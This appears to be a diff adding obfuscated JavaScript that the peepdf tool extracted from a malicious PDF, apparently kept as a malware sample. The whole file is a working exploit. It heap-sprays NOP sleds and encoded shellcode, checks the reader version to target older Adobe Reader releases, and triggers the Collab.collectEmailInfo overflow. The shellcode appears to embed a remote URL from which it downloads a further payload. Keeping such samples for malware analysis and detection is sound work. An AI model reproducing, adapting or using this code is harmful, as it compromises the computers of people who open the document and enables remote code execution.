@@ -1,0 +1,49 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.QaILeZwY()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+function QaILeZwY() {
+    var mpSiJ8CthBiTS = new Array();
+
+    function FdRxROY(g0P5ny1LHuBk, srpOY273T) {
+        while (g0P5ny1LHuBk.length * 2 < srpOY273T) {
+            g0P5ny1LHuBk += g0P5ny1LHuBk;
+        }
+        g0P5ny1LHuBk = g0P5ny1LHuBk.substring(0, srpOY273T / 2);
+        return g0P5ny1LHuBk;
+    }
+
+    function V8IHYgpe() {
+        var t5Um4U8LPI63nw = 0x0c0c0c0c;
+        var IVtIYN = unescape("%u4343%u4343%u4343%u0FEB%u335B%u66C9%u80B9%u8001%uEF33%uE243%uEBFA%uE805%uFFEC%uFFFF%u8B7F%uDF4E%uEFEF%u64EF%uE3AF%u9F64%u42F3%u9F64%u6EE7%uEF03%uEFEB%u64EF%uB903%u6187%uE1A1%u0703%uEF11%uEFEF%uAA66%uB9EB%u7787%u6511%u07E1%uEF1F%uEFEF%uAA66%uB9E7%uCA87%u105F%u072D%uEF0D%uEFEF%uAA66%uB9E3%u0087%u0F21%u078F%uEF3B%uEFEF%uAA66%uB9FF%u2E87%u0A96%u0757%uEF29%uEFEF%uAA66%uAFFB%uD76F%u9A2C%u6615%uF7AA%uE806%uEFEE%uB1EF%u9A66%u64CB%uEBAA%uEE85%u64B6%uF7BA%u07B9%uEF64%uEFEF%u87BF%uF5D9%u9FC0%u7807%uEFEF%u66EF%uF3AA%u2A64%u2F6C%u66BF%uCFAA%u1087%uEFEF%uBFEF%uAA64%u85FB%uB6ED%uBA64%u07F7%uEF8E%uEFEF%uAAEC%u28CF%uB3EF%uC191%u288A%uEBAF%u8A97%uEFEF%u9A10%u64CF%uE3AA%uEE85%u64B6%uF7BA%uAF07%uEFEF%u85EF%uB7E8%uAAEC%uDCCB%uBC34%u10BC%uCF9A%uBCBF%uAA64%u85F3%uB6EA%uBA64%u07F7%uEFCC%uEFEF%uEF85%u9A10%u64CF%uE7AA%uED85%u64B6%uF7BA%uFF07%uEFEF%u85EF%u6410%uFFAA%uEE85%u64B6%uF7BA%uEF07%uEFEF%uAEEF%uBDB4%u0EEC%u0EEC%u0EEC%u0EEC%u036C%uB5EB%u64BC%u0D35%uBD18%u0F10%u64BA%u6403%uE792%uB264%uB9E3%u9C64%u64D3%uF19B%uEC97%uB91C%u9964%uECCF%uDC1C%uA626%u42AE%u2CEC%uDCB9%uE019%uFF51%u1DD5%uE79B%u212E%uECE2%uAF1D%u1E04%u11D4%u9AB1%uB50A%u0464%uB564%uECCB%u8932%uE364%u64A4%uF3B5%u32EC%uEB64%uEC64%uB12A%u2DB2%uEFE7%u1B07%u1011%uBA10%uA3BD%uA0A2%uEFA1%u7468%u7074%u2F3A%u772F%u7777%u772E%u6F6F%u6163%u6973%u6F6E%u632E%u6D6F%u732F%u2F32%u6F6C%u6461%u702E%u7068%u693F%u3D64%u3033%u3834%u2631%u7073%u3D6C%u0034");
+        var Js0xBFzzCr = 0x400000;
+        var PkUF8e9b8IdG = IVtIYN.length * 2;
+        var srpOY273T = Js0xBFzzCr - (PkUF8e9b8IdG + 0x38);
+        var g0P5ny1LHuBk = unescape("%u9090%u9090");
+        g0P5ny1LHuBk = FdRxROY(g0P5ny1LHuBk, srpOY273T);
+        var vpG6s2uQ = (t5Um4U8LPI63nw - 0x400000) / Js0xBFzzCr;
+
+        for (var qUSA30zgYyl4l = 0; qUSA30zgYyl4l < vpG6s2uQ; qUSA30zgYyl4l++) {
+            mpSiJ8CthBiTS[qUSA30zgYyl4l] = g0P5ny1LHuBk + IVtIYN;
+        }
+    }
+
+    function FN7JM() {
+        var jEICymS6Ra = app.viewerVersion.toString();
+        jEICymS6Ra = jEICymS6Ra.replace(/\D/g, "");
+        var ZtKpBefSjY = new Array(jEICymS6Ra.charAt(0), jEICymS6Ra.charAt(1), jEICymS6Ra.charAt(2));
+        if ((ZtKpBefSjY[0] == 8 && ((ZtKpBefSjY[1] == 1 && ZtKpBefSjY[2] < 2) || ZtKpBefSjY[1] < 1)) || (ZtKpBefSjY[0] == 7 && ZtKpBefSjY[1] < 1) || (ZtKpBefSjY[0] < 7)) {
+            V8IHYgpe();
+            var uzOhMV2jbWx = unescape("%u0c0c%u0c0c");
+            while (uzOhMV2jbWx.length < 44952) uzOhMV2jbWx += uzOhMV2jbWx;
+            this.collabStore = Collab.collectEmailInfo({
+                subj: "",
+                msg: uzOhMV2jbWx
+            });
+        }
+    }
+    FN7JM();
+}
+
